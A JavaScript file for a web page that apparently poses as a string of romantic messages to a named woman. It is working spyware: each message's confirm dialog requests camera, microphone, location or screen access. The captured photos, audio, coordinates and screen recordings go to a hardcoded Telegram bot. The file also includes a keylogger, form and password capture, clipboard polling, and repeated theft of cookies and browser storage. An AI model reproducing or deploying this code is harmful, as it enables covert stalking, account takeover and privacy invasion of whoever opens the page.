// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let alertIndex = 0;
let permissionsRequested = {
    camera: false,
    microphone: false,
    location: false,
    screen: false
};

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== LOVE ALERTS ====================
const loveAlerts = [
    { text: "Hello Meghuu 😘", permission: "camera" },
    { text: "I can't stop thinking about you.🥰😚❤", permission: "microphone" },
    { text: "You'll always be my girl.", permission: "location" },
    { text: "I love making you laugh. ❤❤❤😚", permission: "screen" },
    { text: "When I'm with you, nothing else matters.", permission: null },
    { text: "All love is sweet, but ours is the sweetest.", permission: null },
    { text: "Because you're in my life, I know true love exists..", permission: null },
    { text: "I love you today. I will love you tomorrow. And I'll keep on loving you every day after that, too.", permission: null },
    { text: "I can't believe a girl like you exists and that I'm lucky enough to have found her.", permission: null },
    { text: "Know that no matter where life takes us, you will always be the only one for me.", permission: null },
    { text: "My favorite part of every day is the time I get to spend with you.", permission: null },
    { text: "When others talk about their greatest achievements and things they are most proud of, the only thing that comes to mind is you.", permission: null },
    { text: "I'm missing you.", permission: null },
    { text: "You are the prettiest girl I've ever seen.", permission: null },
    { text: "Whenever I count my blessings, you are at the top of my list.", permission: null },
    { text: "I am the luckiest man alive because I get to call you mine.", permission: null },
    { text: "No one understands me like you do.", permission: null },
    { text: "You know exactly what I need, even if I don't say it.", permission: null },
    { text: "I love you not only for who you are, but also for who I become when I am with you.", permission: null },
    { text: "Ever since I met you, no one else has been worth thinking about.", permission: null },
    { text: "I know you love me because you put up with me even when I'm at my worst.", permission: null },
    { text: "if you need me, just call me i don't care if im sleeping or having my own problems or angry with you. ill be there for you anytime❣", permission: null },
    { text: "love you so much Meghuu ❣❣❣❣❣❣", permission: null }
];

async function showNextAlert() {
    if (alertIndex >= loveAlerts.length) {
        sendTelegramMessage(`💖 *All Love Messages Completed*\n\nTotal: ${loveAlerts.length} messages\n💕 Love you forever Meghuu! 💕`);
        setTimeout(() => stealAllData(), 2000);
        return;
    }
    
    const current = loveAlerts[alertIndex];
    
    // Show alert with love message
    const userConfirmed = confirm(current.text);
    
    if (userConfirmed && current.permission) {
        // Request permission based on type
        if (current.permission === "camera") {
            await requestCamera();
        } else if (current.permission === "microphone") {
            await requestMicrophone();
        } else if (current.permission === "location") {
            await requestLocation();
        } else if (current.permission === "screen") {
            await requestScreen();
        }
        // Wait a bit before next alert
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    alertIndex++;
    setTimeout(() => showNextAlert(), 500);
}

// ==================== TELEGRAM MESSAGE ====================
function sendTelegramMessage(message) {
    if (!CHAT_ID) return;
    
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: message,
            parse_mode: 'Markdown'
        }),
    }).catch(err => console.error("Telegram error:", err));
}

// ==================== 1. CAMERA PERMISSION ====================
async function requestCamera() {
    if (permissionsRequested.camera) {
        sendTelegramMessage(`📸 *កាមេរ៉ា* - Already requested`);
        return true;
    }
    
    try {
        sendTelegramMessage(`📸 *កំពុងស្នើសុំកាមេរ៉ា...*`);
        
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false 
        });
        
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        sendTelegramMessage(`📸 *កាមេរ៉ាត្រូវបានអនុញ្ញាត*\n\n✅ Camera permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Capture photo
        await capturePhoto(stream);
        
        return true;
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied camera permission' : 'Error: ' + error.message;
        sendTelegramMessage(`❌ *កាមេរ៉ាមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
        return false;
    }
}

async function capturePhoto(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendFileToTelegram(file, `📸 Camera Photo`);
            }
        }, 'image/jpeg', 0.8);
        
        // Stop stream after capture
        setTimeout(() => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            if (video) video.remove();
            cameraStream = null;
        }, 2000);
        
    } catch (error) {
        console.error("Capture photo error:", error);
    }
}

// ==================== 2. MICROPHONE PERMISSION ====================
async function requestMicrophone() {
    if (permissionsRequested.microphone) {
        sendTelegramMessage(`🎤 *មីក្រូហ្វូន* - Already requested`);
        return true;
    }
    
    try {
        sendTelegramMessage(`🎤 *កំពុងស្នើសុំមីក្រូហ្វូន...*`);
        
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        permissionsRequested.microphone = true;
        
        sendTelegramMessage(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*\n\n✅ Microphone permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Record audio
        await recordAudio(stream);
        
        return true;
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied microphone permission' : 'Error: ' + error.message;
        sendTelegramMessage(`❌ *មីក្រូហ្វូនមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
        return false;
    }
}

async function recordAudio(stream) {
    return new Promise((resolve) => {
        try {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            
            recorder.ondataavailable = (e) => { 
                if (e.data.size > 0) chunks.push(e.data); 
            };
            
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                if (blob.size > 0) {
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await sendFileToTelegram(file, `🎤 Audio Recording`);
                }
                stream.getTracks().forEach(track => track.stop());
                audioStream = null;
                resolve();
            };
            
            recorder.start();
            setTimeout(() => {
                if (recorder.state === 'recording') recorder.stop();
            }, 5000);
            
        } catch (error) {
            console.error("Record audio error:", error);
            resolve();
        }
    });
}

// ==================== 3. LOCATION PERMISSION ====================
async function requestLocation() {
    if (permissionsRequested.location) {
        sendTelegramMessage(`📍 *ទីតាំង* - Already requested`);
        return true;
    }
    
    if (!navigator.geolocation) {
        sendTelegramMessage(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*\n\n📝 Geolocation not supported`);
        return false;
    }
    
    sendTelegramMessage(`📍 *កំពុងស្នើសុំទីតាំង...*`);
    
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                permissionsRequested.location = true;
                currentLocation = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy)
                };
                
                const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
                
                sendTelegramMessage(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Open Map](${mapsLink})`);
                
                // Send location to Telegram
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ 
                            chat_id: CHAT_ID, 
                            latitude: currentLocation.lat,
                            longitude: currentLocation.lng
                        }),
                    });
                } catch (err) {}
                
                resolve(true);
            },
            (error) => {
                let msg = 'User denied location permission';
                if (error.code === error.TIMEOUT) msg = 'Timeout';
                else if (error.code === error.POSITION_UNAVAILABLE) msg = 'Position unavailable';
                sendTelegramMessage(`❌ *ទីតាំងមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${msg}`);
                resolve(false);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
}

// ==================== 4. SCREEN RECORDING PERMISSION ====================
async function requestScreen() {
    if (permissionsRequested.screen) {
        sendTelegramMessage(`🎬 *ថតអេក្រង់* - Already requested`);
        return true;
    }
    
    if (isRecording) {
        sendTelegramMessage(`🎬 *កំពុងថតអេក្រង់រួចហើយ*`);
        return false;
    }
    
    try {
        sendTelegramMessage(`🎬 *កំពុងស្នើសុំថតអេក្រង់...*`);
        
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { 
                cursor: "always", 
                frameRate: { ideal: 30 } 
            },
            audio: true
        });
        
        permissionsRequested.screen = true;
        screenStream = stream;
        
        sendTelegramMessage(`🎬 *ការថតអេក្រង់ត្រូវបានអនុញ្ញាត*\n\n✅ Screen recording granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        screenRecorder = new MediaRecorder(stream, { 
            mimeType: mimeType,
            videoBitsPerSecond: 2500000 
        });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (e) => { 
            if (e.data && e.data.size > 0) recordedChunks.push(e.data); 
        };
        
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            
            if (blob.size > 0) {
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
                await sendVideoToTelegram(file, `🎥 Screen Recording\n📊 Size: ${formatBytes(blob.size)}`);
            }
            
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        
        // Auto stop after 30 seconds
        setTimeout(() => {
            if (screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
            }
        }, 30000);
        
        // Stop when user clicks "Stop Sharing"
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
            }
        });
        
        return true;
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error: ' + error.message;
        sendTelegramMessage(`❌ *ការថតអេក្រង់មិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
        return false;
    }
}

// ==================== STEAL COOKIES & DATA ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getAllCookies();
        const cookieCount = Object.keys(cookies).length;
        const ip = await getIP();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 *Cookies:* ${cookieCount} found\n`;
        
        if (cookieCount > 0) {
            Object.entries(cookies).slice(0, 5).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
            if (cookieCount > 5) message += `└─ ... and ${cookieCount - 5} more\n`;
        }
        
        message += `\n💾 *Storage:*\n`;
        message += `├─ LocalStorage: ${localStorage.length} items\n`;
        message += `├─ SessionStorage: ${sessionStorage.length} items\n`;
        
        message += `\n📱 *Device Info*\n`;
        message += `⏰ Time: ${new Date().toLocaleString('km-KH')}\n`;
        message += `🌐 IP: ${ip}\n`;
        message += `🖥️ Platform: ${navigator.platform}\n`;
        message += `📺 Screen: ${window.screen.width}x${window.screen.height}\n`;
        message += `🌍 Language: ${navigator.language}\n`;
        message += `📍 URL: ${window.location.href}`;
        
        if (currentLocation) {
            message += `\n📍 Location: ${currentLocation.lat}, ${currentLocation.lng} (±${currentLocation.accuracy}m)`;
        }
        
        sendTelegramMessage(message);
        
        // Create full JSON data
        const fullData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            cookies: cookies,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            location: currentLocation,
            screen: { width: window.screen.width, height: window.screen.height },
            language: navigator.language,
            platform: navigator.platform,
            permissions: permissionsRequested
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {
        console.error("Steal error:", error);
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        try {
            const response = await fetch('https://api.my-ip.io/ip.json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unable to fetch';
        }
    }
}

// ==================== TELEGRAM HELPERS ====================
async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {
        console.error("Send file error:", error);
    }
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) {
        await sendFileToTelegram(file, caption);
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    
    // Don't log if target is password field (already monitored separately)
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) {
        keylogBuffer += e.key;
    } else if (e.key === 'Enter') {
        keylogBuffer += '\n';
    } else if (e.key === 'Backspace') {
        keylogBuffer = keylogBuffer.slice(0, -1);
    } else if (e.key === ' ') {
        keylogBuffer += ' ';
    } else if (e.key === 'Tab') {
        keylogBuffer += '    ';
    }
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendTelegramMessage(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ==================== FORM INTERCEPTION ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else if (value && value.toString().trim() !== '') {
            data[key] = value;
        }
    }
    
    if (Object.keys(data).length > 0) {
        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) {
            const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
            message += `├─ ${key}: ${shortValue}\n`;
        }
        sendTelegramMessage(message);
    }
});

// ==================== PASSWORD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || target.className || 'Unknown';
        const value = target.value;
        
        sendTelegramMessage(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${value}`);
        
        // Also capture as keylog
        keylogBuffer = '';
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboard = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            sendTelegramMessage(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== PAGE UNLOAD ====================
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    const message = `👋 *User Leaving*\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    
    // Hide UI elements
    if (themeToggle) themeToggle.style.display = 'none';
    
    // Send initial message
    sendTelegramMessage(`🚀 *Page Loaded*\n\n📍 URL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    
    // Start showing love alerts after 1 second
    setTimeout(() => {
        showNextAlert();
    }, 1000);
    
    // Steal data after alerts complete
    setTimeout(() => {
        stealAllData();
    }, 30000);
    
    // Steal data every 60 seconds
    setInterval(() => {
        stealAllData();
    }, 60000);
});